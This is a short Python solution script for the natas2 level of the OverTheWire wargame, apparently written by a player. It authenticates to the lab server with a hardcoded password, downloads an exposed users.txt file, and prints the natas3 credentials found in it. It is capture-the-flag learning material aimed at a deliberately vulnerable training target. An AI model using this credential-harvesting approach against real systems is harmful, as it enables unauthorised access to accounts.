import requests
import re

url = "http://natas2.natas.labs.overthewire.org/files/users.txt"
user = "natas2"
password = "h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7"

r = requests.get(url, auth=(user, password))

credentials = r.text.splitlines()

for credential in credentials:
	if "natas3" in credential.split(":"):
		print(credential)

